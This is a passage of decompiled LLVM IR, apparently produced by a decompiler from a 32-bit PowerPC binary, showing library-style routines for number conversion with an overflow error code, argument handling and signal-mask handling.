  %v1_100087ec = phi i32 [ 40, %dec_label_pc_100087a4 ], [ %v1_10008794, %dec_label_pc_10008780 ], [ %v1_100087b0, %dec_label_pc_100087b0 ]
  %v1_100087b4 = load i32, i32* %r30.global-to-local, align 4
  %v2_100087b4 = icmp slt i32 %v1_100087ec, %v1_100087b4
  %v1_100087b8 = add i32 %v0_100087b8, 1
  store i32 %v1_100087b8, i32* %r31.global-to-local, align 4
  br i1 %v2_100087b4, label %dec_label_pc_100087c0, label %dec_label_pc_100087f4

dec_label_pc_100087c0:                            ; preds = %dec_label_pc_100087b4
  br i1 %v3_10008784, label %dec_label_pc_100087d4, label %dec_label_pc_100087c4

dec_label_pc_100087c4:                            ; preds = %dec_label_pc_100087c0
  %v1_100087c8 = load i32, i32* %r27.global-to-local, align 4
  %v0_100087cc.not = icmp ne i32 %v0_100087c4, %v1_10008784
  %tmp25 = icmp ule i32 %v1_100087ec, %v1_100087c8
  %or.cond = or i1 %tmp25, %v0_100087cc.not
  br i1 %or.cond, label %dec_label_pc_100087ec, label %dec_label_pc_100087d4

dec_label_pc_100087d4:                            ; preds = %dec_label_pc_100087c4, %dec_label_pc_100087c0
  %v0_100087d4 = call i32 @function_10004b48()
  %v0_100087d8 = load i32, i32* %r28.global-to-local, align 4
  %v1_100087d8 = load i32, i32* %r26.global-to-local, align 4
  %v2_100087d8 = and i32 %v1_100087d8, %v0_100087d8
  store i32 %v2_100087d8, i32* %r28.global-to-local, align 4
  store i32 -1, i32* %r10.global-to-local, align 4
  %v2_100087e4 = inttoptr i32 %v0_100087d4 to i32*
  store i32 34, i32* %v2_100087e4, align 4
  %v0_1000877c.pre = load i32, i32* %r31.global-to-local, align 4
  %v0_10008784.pre.pre = load i32, i32* %r10.global-to-local, align 4
  %v1_10008784.pre.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000877c

dec_label_pc_100087ec:                            ; preds = %dec_label_pc_100087c4
  %v2_100087c4 = mul i32 %v1_100087b4, %v0_100087c4
  %v2_100087ec = add i32 %v2_100087c4, %v1_100087ec
  store i32 %v2_100087ec, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000877c

dec_label_pc_100087f4:                            ; preds = %dec_label_pc_100087b4, %dec_label_pc_10008754
  %v0_100087fc = phi i32 [ %v0_100087fc14, %dec_label_pc_10008754 ], [ %v0_100087fc12, %dec_label_pc_100087b4 ]
  %v0_100087f4 = load i32, i32* %r25.global-to-local, align 4
  %v3_100087f4 = icmp eq i32 %v0_100087f4, 0
  br i1 %v3_100087f4, label %dec_label_pc_10008800, label %dec_label_pc_100087fc

dec_label_pc_100087fc:                            ; preds = %dec_label_pc_100087f4
  %v2_100087fc = inttoptr i32 %v0_100087f4 to i32*
  store i32 %v0_100087fc, i32* %v2_100087fc, align 4
  br label %dec_label_pc_10008800

dec_label_pc_10008800:                            ; preds = %dec_label_pc_100087f4, %dec_label_pc_100087fc
  %v0_10008800 = load i32, i32* %r28.global-to-local, align 4
  %v1_10008800 = sub i32 0, %v0_10008800
  %v0_10008808 = load i32, i32* %r26.global-to-local, align 4
  %v3_10008808 = icmp eq i32 %v0_10008808, 0
  %tmp27 = lshr i32 %v1_10008800, 31
  %tmp28 = add nuw i32 %tmp27, 2147483647
  store i32 %tmp28, i32* @r31, align 4
  %v0_10008844.pre.pre = load i32, i32* %r10.global-to-local, align 4
  br i1 %v3_10008808, label %dec_label_pc_10008834, label %dec_label_pc_1000881c

dec_label_pc_1000881c:                            ; preds = %dec_label_pc_10008800
  %v3_1000881c = icmp ugt i32 %v0_10008844.pre.pre, %tmp28
  br i1 %v3_1000881c, label %dec_label_pc_10008824, label %dec_label_pc_10008834

dec_label_pc_10008824:                            ; preds = %dec_label_pc_1000881c
  %v0_10008824 = call i32 @function_10004b48()
  %v2_1000882c = inttoptr i32 %v0_10008824 to i32*
  store i32 34, i32* %v2_1000882c, align 4
  %v0_10008830 = load i32, i32* @r31, align 4
  store i32 %v0_10008830, i32* %r10.global-to-local, align 4
  %v0_10008834.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_10008834

dec_label_pc_10008834:                            ; preds = %dec_label_pc_10008800, %dec_label_pc_1000881c, %dec_label_pc_10008824
  %v0_10008844.pre = phi i32 [ %v0_10008844.pre.pre, %dec_label_pc_1000881c ], [ %v0_10008830, %dec_label_pc_10008824 ], [ %v0_10008844.pre.pre, %dec_label_pc_10008800 ]
  %v0_10008834 = phi i32 [ %v0_10008800, %dec_label_pc_1000881c ], [ %v0_10008834.pre, %dec_label_pc_10008824 ], [ %v0_10008800, %dec_label_pc_10008800 ]
  %v3_10008834 = icmp eq i32 %v0_10008834, 0
  br i1 %v3_10008834, label %dec_label_pc_10008840, label %dec_label_pc_1000883c

dec_label_pc_1000883c:                            ; preds = %dec_label_pc_10008834
  %v1_1000883c = sub i32 0, %v0_10008844.pre
  store i32 %v1_1000883c, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10008840

dec_label_pc_10008840:                            ; preds = %dec_label_pc_10008834, %dec_label_pc_1000883c
  %v0_10008844 = phi i32 [ %v1_1000883c, %dec_label_pc_1000883c ], [ %v0_10008844.pre, %dec_label_pc_10008834 ]
  ret i32 %v0_10008844

; uselistorder directives
  uselistorder i32 %v0_10008844.pre, { 1, 0 }
  uselistorder i32 %v0_10008844.pre.pre, { 0, 2, 1 }
  uselistorder i32 %v2_100087ec, { 1, 0 }
  uselistorder i32 %v1_100087b8, { 1, 0 }
  uselistorder i32 %v1_10008794, { 1, 0 }
  uselistorder i32 %v1_10008790, { 1, 0 }
  uselistorder i32 %v3_10008780, { 1, 0 }
  uselistorder i32 %v0_100087c4, { 1, 0, 2 }
  uselistorder i32 %v1_10008784, { 0, 2, 1 }
  uselistorder i32 %v0_1000877c, { 1, 0 }
  uselistorder i32 %v2_10008768, { 1, 0, 2 }
  uselistorder i32 %v1_10008740, { 1, 0 }
  uselistorder i32 %v1_1000872c, { 1, 0, 2 }
  uselistorder i32 %v0_10008708, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0, 2, 3 }
  uselistorder i32* %r31.global-to-local, { 0, 1, 7, 2, 3, 6, 4, 5, 8 }
  uselistorder i32* %r30.global-to-local, { 4, 1, 0, 2, 3, 5, 6, 7 }
  uselistorder i32* %r28.global-to-local, { 4, 2, 0, 3, 5, 1 }
  uselistorder i32* %r10.global-to-local, { 0, 1, 5, 2, 3, 4, 6, 7 }
  uselistorder label %dec_label_pc_10008840, { 1, 0 }
  uselistorder label %dec_label_pc_10008834, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10008800, { 1, 0 }
  uselistorder label %dec_label_pc_100087b4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10008780, { 1, 0 }
  uselistorder label %dec_label_pc_10008754, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10008748, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000870c, { 1, 0 }
  uselistorder label %dec_label_pc_10008708, { 1, 0 }
  uselistorder label %dec_label_pc_100086d4, { 1, 0 }
}

define i32 @function_10008858() local_unnamed_addr {
dec_label_pc_10008858:
  %stack_var_-40 = alloca i32, align 4
  %v2_10008874 = ptrtoint i32* %stack_var_-40 to i32
  %v0_1000887c = load i32, i32* @r3, align 4
  store i32 %v0_1000887c, i32* @r31, align 4
  store i32 %v2_10008874, i32* @r3, align 4
  %v0_10008888 = call i32 @function_10008c80()
  %v0_10008890 = call i32 @function_10008c78()
  %v3_10008898 = load i32, i32* @global_var_100104a0.276, align 4
  %v3_1000889c = icmp eq i32 %v3_10008898, 0
  br i1 %v3_1000889c, label %dec_label_pc_100088b0, label %dec_label_pc_100088a4

dec_label_pc_100088a4:                            ; preds = %dec_label_pc_10008858
  %v0_100088a4 = load i32, i32* @r31, align 4
  %v3_100088ac = call i32 @unknown_0(i32 %v0_100088a4, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  br label %dec_label_pc_100088b0

dec_label_pc_100088b0:                            ; preds = %dec_label_pc_10008858, %dec_label_pc_100088a4
  store i32 %v2_10008874, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  %v0_100088b8 = call i32 @function_10008c80()
  store i32 %v0_100088b8, i32* @r3, align 4
  store i32 268470464, i32* @lr, align 4
  %v1_100088bc = call i32 @function_10008be4(i32 %v0_100088b8)
  store i32 268470484, i32* @lr, align 4
  %v2_100088d0 = call i32 @function_10005488(i32 %v1_100088bc, i32 268457096)
  %v0_100088d4 = load i32, i32* @r31, align 4
  %v1_100088d8 = call i32 @function_10009110(i32 %v0_100088d4)
  ret i32 %v1_100088d8

; uselistorder directives
  uselistorder label %dec_label_pc_100088b0, { 1, 0 }
}

define i32 @function_100088dc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_100088dc:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg5, i32* %r8.global-to-local, align 4
  %stack_var_8 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_100088dc = ptrtoint i32* %stack_var_0 to i32
  %v2_100088f8 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_100088f8, i32* %r0.global-to-local, align 4
  %v2_10008900 = ptrtoint i32* %stack_var_8 to i32
  store i32 %v2_100088f8, i32* %stack_var_-48, align 4
  store i32 %arg1, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000892c

dec_label_pc_1000892c:                            ; preds = %dec_label_pc_1000895c, %dec_label_pc_100088dc
  %v0_10008930 = phi i32 [ 0, %dec_label_pc_100088dc ], [ %v1_10008930, %dec_label_pc_1000895c ]
  %stack_var_-52.0 = phi i32 [ %v2_10008900, %dec_label_pc_100088dc ], [ %stack_var_-52.1, %dec_label_pc_1000895c ]
  %stack_var_-56.0 = phi i8 [ 2, %dec_label_pc_100088dc ], [ %stack_var_-56.1, %dec_label_pc_1000895c ]
  %v4_1000892c = zext i8 %stack_var_-56.0 to i32
  %v1_10008930 = add i32 %v0_10008930, 1
  %v1_10008938 = mul nuw nsw i32 %v4_1000892c, 4
  store i32 %v1_10008938, i32* %r0.global-to-local, align 4
  %v2_1000893c = add i32 %v1_10008938, %v2_100088f8
  store i32 %v2_1000893c, i32* %r11.global-to-local, align 4
  %tmp19 = icmp ugt i8 %stack_var_-56.0, 7
  br i1 %tmp19, label %dec_label_pc_10008950, label %dec_label_pc_10008948

dec_label_pc_10008948:                            ; preds = %dec_label_pc_1000892c
  %v1_10008940 = add i8 %stack_var_-56.0, 1
  br label %dec_label_pc_1000895c

dec_label_pc_10008950:                            ; preds = %dec_label_pc_1000892c
  store i32 %stack_var_-52.0, i32* %r11.global-to-local, align 4
  %v1_10008954 = add i32 %stack_var_-52.0, 4
  store i32 %v1_10008954, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000895c

dec_label_pc_1000895c:                            ; preds = %dec_label_pc_10008948, %dec_label_pc_10008950
  %stack_var_-52.1 = phi i32 [ %v1_10008954, %dec_label_pc_10008950 ], [ %stack_var_-52.0, %dec_label_pc_10008948 ]
  %v0_1000895c = phi i32 [ %stack_var_-52.0, %dec_label_pc_10008950 ], [ %v2_1000893c, %dec_label_pc_10008948 ]
  %stack_var_-56.1 = phi i8 [ %stack_var_-56.0, %dec_label_pc_10008950 ], [ %v1_10008940, %dec_label_pc_10008948 ]
  %v1_1000895c = inttoptr i32 %v0_1000895c to i32*
  %v2_1000895c = load i32, i32* %v1_1000895c, align 4
  store i32 %v2_1000895c, i32* %r0.global-to-local, align 4
  %v3_10008960 = icmp eq i32 %v2_1000895c, 0
  br i1 %v3_10008960, label %dec_label_pc_10008968, label %dec_label_pc_1000892c

dec_label_pc_10008968:                            ; preds = %dec_label_pc_1000895c
  %v1_10008968 = mul i32 %v1_10008930, 4
  store i32 %v4_100088dc, i32* %r0.global-to-local, align 4
  %v1_10008970 = add i32 %v1_10008968, 34
  store i32 %v1_10008930, i32* %ctr.global-to-local, align 4
  %v1_10008978 = call i32 @__asm_rlwinm(i32 %v1_10008970, i32 0, i32 0, i32 27)
  %v1_10008980 = load i32, i32* @r1, align 4
  %v3_10008980 = sub i32 %v1_10008980, %v1_10008978
  %v4_10008980 = inttoptr i32 %v3_10008980 to i32*
  store i32 %v4_100088dc, i32* %v4_10008980, align 4
  %v1_10008984 = add i32 %v3_10008980, 23
  store i32 %v1_10008984, i32* %r0.global-to-local, align 4
  %v1_10008988 = call i32 @__asm_rlwinm(i32 %v1_10008984, i32 0, i32 0, i32 27)
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_10008990 = load i32, i32* %r8.global-to-local, align 4
  %v2_10008990 = inttoptr i32 %v1_10008988 to i32*
  store i32 %v0_10008990, i32* %v2_10008990, align 4
  store i32 %v1_10008988, i32* %r11.global-to-local, align 4
  %v0_10008998 = load i32, i32* %r0.global-to-local, align 4
  %v1_10008998 = trunc i32 %v0_10008998 to i8
  store i32 %v2_100088f8, i32* %r0.global-to-local, align 4
  store i32 %v2_100088f8, i32* %stack_var_-48, align 4
  br label %dec_label_pc_100089ac

dec_label_pc_100089ac:                            ; preds = %dec_label_pc_100089e0.dec_label_pc_100089ac_crit_edge, %dec_label_pc_10008968
  %v0_100089b0 = phi i32 [ %v1_10008988, %dec_label_pc_10008968 ], [ %v0_100089b0.pre, %dec_label_pc_100089e0.dec_label_pc_100089ac_crit_edge ]
  %stack_var_-52.2 = phi i32 [ %v2_10008900, %dec_label_pc_10008968 ], [ %stack_var_-52.3, %dec_label_pc_100089e0.dec_label_pc_100089ac_crit_edge ]
  %stack_var_-56.2 = phi i8 [ %v1_10008998, %dec_label_pc_10008968 ], [ %stack_var_-56.3, %dec_label_pc_100089e0.dec_label_pc_100089ac_crit_edge ]
  %v1_100089b0 = add i32 %v0_100089b0, 4
  store i32 %v1_100089b0, i32* %r11.global-to-local, align 4
  %tmp20 = icmp ugt i8 %stack_var_-56.2, 7
  br i1 %tmp20, label %dec_label_pc_100089d4, label %dec_label_pc_100089c4

dec_label_pc_100089c4:                            ; preds = %dec_label_pc_100089ac
  %v4_100089ac = zext i8 %stack_var_-56.2 to i32
  %v1_100089bc = add i8 %stack_var_-56.2, 1
  %v1_100089b8 = mul nuw nsw i32 %v4_100089ac, 4
  %v3_100089c4 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_100089c4, i32* %r0.global-to-local, align 4
  %v2_100089cc = add i32 %v3_100089c4, %v1_100089b8
  br label %dec_label_pc_100089e0

dec_label_pc_100089d4:                            ; preds = %dec_label_pc_100089ac
  %v1_100089d8 = add i32 %stack_var_-52.2, 4
  store i32 %v1_100089d8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_100089e0

dec_label_pc_100089e0:                            ; preds = %dec_label_pc_100089c4, %dec_label_pc_100089d4
  %stack_var_-52.3 = phi i32 [ %v1_100089d8, %dec_label_pc_100089d4 ], [ %stack_var_-52.2, %dec_label_pc_100089c4 ]
  %v0_100089e0 = phi i32 [ %stack_var_-52.2, %dec_label_pc_100089d4 ], [ %v2_100089cc, %dec_label_pc_100089c4 ]
  %stack_var_-56.3 = phi i8 [ %stack_var_-56.2, %dec_label_pc_100089d4 ], [ %v1_100089bc, %dec_label_pc_100089c4 ]
  %v1_100089e0 = inttoptr i32 %v0_100089e0 to i32*
  %v2_100089e0 = load i32, i32* %v1_100089e0, align 4
  store i32 %v2_100089e0, i32* %r0.global-to-local, align 4
  %v2_100089e4 = inttoptr i32 %v1_100089b0 to i32*
  store i32 %v2_100089e0, i32* %v2_100089e4, align 4
  %v0_100089e8 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100089e8 = add i32 %v0_100089e8, -1
  store i32 %v1_100089e8, i32* %ctr.global-to-local, align 4
  %v2_100089e8 = icmp eq i32 %v1_100089e8, 0
  br i1 %v2_100089e8, label %dec_label_pc_100089ec, label %dec_label_pc_100089e0.dec_label_pc_100089ac_crit_edge

dec_label_pc_100089e0.dec_label_pc_100089ac_crit_edge: ; preds = %dec_label_pc_100089e0
  %v0_100089b0.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_100089ac

dec_label_pc_100089ec:                            ; preds = %dec_label_pc_100089e0
  %v3_100089f0 = load i32, i32* @global_var_100104a8.278, align 4
  store i32 268470776, i32* @lr, align 4
  %v2_100089f4 = call i32 @function_10009194(i32 %v3_100089f0, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  %v0_100089f8 = load i32, i32* @r1, align 4
  %v1_100089f8 = inttoptr i32 %v0_100089f8 to i32*
  %v2_100089f8 = load i32, i32* %v1_100089f8, align 4
  store i32 %v2_100089f8, i32* %r11.global-to-local, align 4
  %v1_100089fc = add i32 %v2_100089f8, 4
  %v2_100089fc = inttoptr i32 %v1_100089fc to i32*
  %v3_100089fc = load i32, i32* %v2_100089fc, align 4
  store i32 %v3_100089fc, i32* %r0.global-to-local, align 4
  ret i32 %v2_100089f4

; uselistorder directives
  uselistorder i32 %v1_100089e8, { 1, 0 }
  uselistorder i8 %stack_var_-56.2, { 2, 0, 3, 1 }
  uselistorder i32 %v1_10008938, { 1, 0 }
  uselistorder i32 %v1_10008930, { 1, 0, 2 }
  uselistorder i8 %stack_var_-56.0, { 2, 0, 1, 3 }
  uselistorder i32 %stack_var_-52.0, { 0, 1, 3, 2 }
  uselistorder i32 %v2_100088f8, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r8.global-to-local, { 1, 2, 0 }
  uselistorder i32 27, { 2, 3, 0, 1, 4 }
  uselistorder label %dec_label_pc_100089e0, { 1, 0 }
  uselistorder label %dec_label_pc_1000895c, { 1, 0 }
}

define i32 @function_10008a10(i32 %arg1) local_unnamed_addr {
dec_label_pc_10008a10:
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-304 = alloca i32, align 4
  %stack_var_-432 = alloca i32, align 4
  %stack_var_-440 = alloca i32, align 4
  store i32 %arg1, i32* %r8.global-to-local, align 4
  %v3_10008a18 = icmp eq i32 %arg1, 0
  br i1 %v3_10008a18, label %dec_label_pc_10008bc4, label %dec_label_pc_10008a40.lr.ph

dec_label_pc_10008a40.lr.ph:                      ; preds = %dec_label_pc_10008a10
  %v2_10008a34 = ptrtoint i32* %stack_var_-440 to i32
  store i32 %v2_10008a34, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  %v2_10008a4045 = add i32 %v2_10008a34, 132
  %v3_10008a4046 = inttoptr i32 %v2_10008a4045 to i32*
  store i32 0, i32* %v3_10008a4046, align 4
  %v0_10008a4447 = load i32, i32* %r11.global-to-local, align 4
  %v1_10008a4448 = add i32 %v0_10008a4447, -1
  store i32 %v1_10008a4448, i32* %r11.global-to-local, align 4
  %v1_10008a4849 = mul i32 %v1_10008a4448, 4
  %v1_10008a4c50 = load i32, i32* %r7.global-to-local, align 4
  %v2_10008a4c51 = add i32 %v1_10008a4c50, %v1_10008a4849
  %v0_10008a5052 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10008a5053 = add i32 %v0_10008a5052, -1
  store i32 %v1_10008a5053, i32* %ctr.global-to-local, align 4
  %v2_10008a5054 = icmp eq i32 %v1_10008a5053, 0
  br i1 %v2_10008a5054, label %dec_label_pc_10008a54, label %dec_label_pc_10008a40.dec_label_pc_10008a40_crit_edge

dec_label_pc_10008a40.dec_label_pc_10008a40_crit_edge: ; preds = %dec_label_pc_10008a40.lr.ph, %dec_label_pc_10008a40.dec_label_pc_10008a40_crit_edge
  %v2_10008a4c55 = phi i32 [ %v2_10008a4c, %dec_label_pc_10008a40.dec_label_pc_10008a40_crit_edge ], [ %v2_10008a4c51, %dec_label_pc_10008a40.lr.ph ]
  %v0_10008a40.pre = load i32, i32* %r10.global-to-local, align 4
  %v2_10008a40 = add i32 %v2_10008a4c55, 8
  %v3_10008a40 = inttoptr i32 %v2_10008a40 to i32*
  store i32 %v0_10008a40.pre, i32* %v3_10008a40, align 4
  %v0_10008a44 = load i32, i32* %r11.global-to-local, align 4
  %v1_10008a44 = add i32 %v0_10008a44, -1
  store i32 %v1_10008a44, i32* %r11.global-to-local, align 4
  %v1_10008a48 = mul i32 %v1_10008a44, 4
  %v1_10008a4c = load i32, i32* %r7.global-to-local, align 4
  %v2_10008a4c = add i32 %v1_10008a4c, %v1_10008a48
  %v0_10008a50 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10008a50 = add i32 %v0_10008a50, -1
  store i32 %v1_10008a50, i32* %ctr.global-to-local, align 4
  %v2_10008a50 = icmp eq i32 %v1_10008a50, 0
  br i1 %v2_10008a50, label %dec_label_pc_10008a54, label %dec_label_pc_10008a40.dec_label_pc_10008a40_crit_edge

dec_label_pc_10008a54:                            ; preds = %dec_label_pc_10008a40.dec_label_pc_10008a40_crit_edge, %dec_label_pc_10008a40.lr.ph
  %v2_10008a4c.lcssa = phi i32 [ %v2_10008a4c51, %dec_label_pc_10008a40.lr.ph ], [ %v2_10008a4c, %dec_label_pc_10008a40.dec_label_pc_10008a40_crit_edge ]
  %v0_10008a68.pre = load i32, i32* %r8.global-to-local, align 4
  %v2_10008a54 = ptrtoint i32* %stack_var_-432 to i32
  store i32 %v2_10008a54, i32* %r3.global-to-local, align 4
  store i32 %v0_10008a68.pre, i32* %stack_var_-440, align 4
  %v3_10008a6c = call i32 @function_1000b348(i32 %v2_10008a54, i32 17, i32 %v2_10008a4c.lcssa)
  store i32 %v3_10008a6c, i32* %r3.global-to-local, align 4
  %v1_10008a70 = icmp slt i32 %v3_10008a6c, 0
  br i1 %v1_10008a70, label %dec_label_pc_10008bcc, label %dec_label_pc_10008a78

dec_label_pc_10008a78:                            ; preds = %dec_label_pc_10008a54
  %v2_10008a78 = ptrtoint i32* %stack_var_-304 to i32
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 268470924, i32* @lr, align 4
  %v3_10008a88 = call i32 @function_1000948c(i32 0, i32 %v2_10008a54, i32 %v2_10008a78)
  store i32 %v3_10008a88, i32* %r3.global-to-local, align 4
  %v3_10008a8c = icmp eq i32 %v3_10008a88, 0
  br i1 %v3_10008a8c, label %dec_label_pc_10008a94, label %dec_label_pc_10008bcc

dec_label_pc_10008a94:                            ; preds = %dec_label_pc_10008a78
  store i32 %v2_10008a78, i32* %r3.global-to-local, align 4
  %v2_10008a9c = call i32 @function_1000b320(i32 %v2_10008a78, i32 17)
  store i32 %v2_10008a9c, i32* %r3.global-to-local, align 4
  %v3_10008aa0 = icmp eq i32 %v2_10008a9c, 0
  br i1 %v3_10008aa0, label %dec_label_pc_10008ac0.lr.ph, label %dec_label_pc_10008b8c

dec_label_pc_10008ac0.lr.ph:                      ; preds = %dec_label_pc_10008a94
  store i32 %v2_10008a34, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  store i32 0, i32* %v3_10008a4046, align 4
  %v0_10008ac436 = load i32, i32* %r11.global-to-local, align 4
  %v1_10008ac437 = add i32 %v0_10008ac436, -1
  store i32 %v1_10008ac437, i32* %r11.global-to-local, align 4
  %v1_10008ac838 = mul i32 %v1_10008ac437, 4
  %v1_10008acc39 = load i32, i32* %r8.global-to-local, align 4
  %v2_10008acc40 = add i32 %v1_10008acc39, %v1_10008ac838
  %v0_10008ad041 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10008ad042 = add i32 %v0_10008ad041, -1
  store i32 %v1_10008ad042, i32* %ctr.global-to-local, align 4
  %v2_10008ad043 = icmp eq i32 %v1_10008ad042, 0
  br i1 %v2_10008ad043, label %dec_label_pc_10008ad4, label %dec_label_pc_10008ac0.dec_label_pc_10008ac0_crit_edge

dec_label_pc_10008ac0.dec_label_pc_10008ac0_crit_edge: ; preds = %dec_label_pc_10008ac0.lr.ph, %dec_label_pc_10008ac0.dec_label_pc_10008ac0_crit_edge
  %v2_10008acc44 = phi i32 [ %v2_10008acc, %dec_label_pc_10008ac0.dec_label_pc_10008ac0_crit_edge ], [ %v2_10008acc40, %dec_label_pc_10008ac0.lr.ph ]
  %v0_10008ac0.pre = load i32, i32* %r10.global-to-local, align 4
  %v2_10008ac0 = add i32 %v2_10008acc44, 8
  %v3_10008ac0 = inttoptr i32 %v2_10008ac0 to i32*
  store i32 %v0_10008ac0.pre, i32* %v3_10008ac0, align 4
  %v0_10008ac4 = load i32, i32* %r11.global-to-local, align 4
  %v1_10008ac4 = add i32 %v0_10008ac4, -1
  store i32 %v1_10008ac4, i32* %r11.global-to-local, align 4
  %v1_10008ac8 = mul i32 %v1_10008ac4, 4
  %v1_10008acc = load i32, i32* %r8.global-to-local, align 4
  %v2_10008acc = add i32 %v1_10008acc, %v1_10008ac8
  %v0_10008ad0 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10008ad0 = add i32 %v0_10008ad0, -1
  store i32 %v1_10008ad0, i32* %ctr.global-to-local, align 4
  %v2_10008ad0 = icmp eq i32 %v1_10008ad0, 0
  br i1 %v2_10008ad0, label %dec_label_pc_10008ad4, label %dec_label_pc_10008ac0.dec_label_pc_10008ac0_crit_edge

dec_label_pc_10008ad4:                            ; preds = %dec_label_pc_10008ac0.dec_label_pc_10008ac0_crit_edge, %dec_label_pc_10008ac0.lr.ph
  %v2_10008acc.lcssa = phi i32 [ %v2_10008acc40, %dec_label_pc_10008ac0.lr.ph ], [ %v2_10008acc, %dec_label_pc_10008ac0.dec_label_pc_10008ac0_crit_edge ]
  store i32 %v2_10008a54, i32* %r3.global-to-local, align 4
  %v3_10008adc = call i32 @function_1000b348(i32 %v2_10008a54, i32 17, i32 %v2_10008acc.lcssa)
  store i32 %v3_10008adc, i32* %r3.global-to-local, align 4
  %v1_10008ae0 = icmp slt i32 %v3_10008adc, 0
  br i1 %v1_10008ae0, label %dec_label_pc_10008bcc, label %dec_label_pc_10008ae8

dec_label_pc_10008ae8:                            ; preds = %dec_label_pc_10008ad4
  store i32 17, i32* %r3.global-to-local, align 4
  %v2_10008af0 = ptrtoint i32* %stack_var_-176 to i32
  store i32 268471032, i32* @lr, align 4
  %v4_10008af4 = call i32 @function_1000b25c(i32 17, i32* null, i32 %v2_10008af0)
  store i32 %v4_10008af4, i32* %r3.global-to-local, align 4
  %tmp33 = icmp sgt i32 %v4_10008af4, -1
  br i1 %tmp33, label %dec_label_pc_10008b28, label %dec_label_pc_10008b00

dec_label_pc_10008b00:                            ; preds = %dec_label_pc_10008ae8
  %v0_10008b00 = call i32 @function_10004b48()
  store i32 %v0_10008b00, i32* %r3.global-to-local, align 4
  %v1_10008b08 = inttoptr i32 %v0_10008b00 to i32*
  %v2_10008b08 = load i32, i32* %v1_10008b08, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268471068, i32* @lr, align 4
  %v3_10008b18 = call i32 @function_1000948c(i32 2, i32 %v2_10008a78, i32 0)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v2_10008b20 = inttoptr i32 %v0_10008b00 to i32*
  store i32 %v2_10008b08, i32* %v2_10008b20, align 4
  %v0_10008be0.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10008bd0

dec_label_pc_10008b28:                            ; preds = %dec_label_pc_10008ae8
  %v3_10008b28 = load i32, i32* %stack_var_-176, align 4
  %v3_10008b34 = icmp eq i32 %v3_10008b28, 1
  br i1 %v3_10008b34, label %dec_label_pc_10008b3c, label %dec_label_pc_10008b70

dec_label_pc_10008b3c:                            ; preds = %dec_label_pc_10008b28
  store i32 %v2_10008a34, i32* %r3.global-to-local, align 4
  store i32 268471112, i32* @lr, align 4
  %v2_10008b44 = call i32 @function_100092fc(i32 %v2_10008a34, i32 %v2_10008a34)
  store i32 %v2_10008b44, i32* %r3.global-to-local, align 4
  store i32 %v2_10008b44, i32* @r31, align 4
  %v0_10008b4c = call i32 @function_10004b48()
  store i32 %v0_10008b4c, i32* %r3.global-to-local, align 4
  %v1_10008b50 = inttoptr i32 %v0_10008b4c to i32*
  %v2_10008b50 = load i32, i32* %v1_10008b50, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268471144, i32* @lr, align 4
  %v3_10008b64 = call i32 @function_1000948c(i32 2, i32 %v2_10008a78, i32 0)
  store i32 %v3_10008b64, i32* %r3.global-to-local, align 4
  %v2_10008b68 = inttoptr i32 %v0_10008b4c to i32*
  store i32 %v2_10008b50, i32* %v2_10008b68, align 4
  %v0_10008b98.pr = load i32, i32* @r31, align 4
  br label %dec_label_pc_10008b98

dec_label_pc_10008b70:                            ; preds = %dec_label_pc_10008b28
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268471168, i32* @lr, align 4
  %v3_10008b7c = call i32 @function_1000948c(i32 2, i32 %v2_10008a78, i32 0)
  br label %dec_label_pc_10008b8c

dec_label_pc_10008b8c:                            ; preds = %dec_label_pc_10008a94, %dec_label_pc_10008b70
  store i32 %v2_10008a34, i32* %r3.global-to-local, align 4
  store i32 268471188, i32* @lr, align 4
  %v2_10008b90 = call i32 @function_100092fc(i32 %v2_10008a34, i32 %v2_10008a34)
  store i32 %v2_10008b90, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10008b98

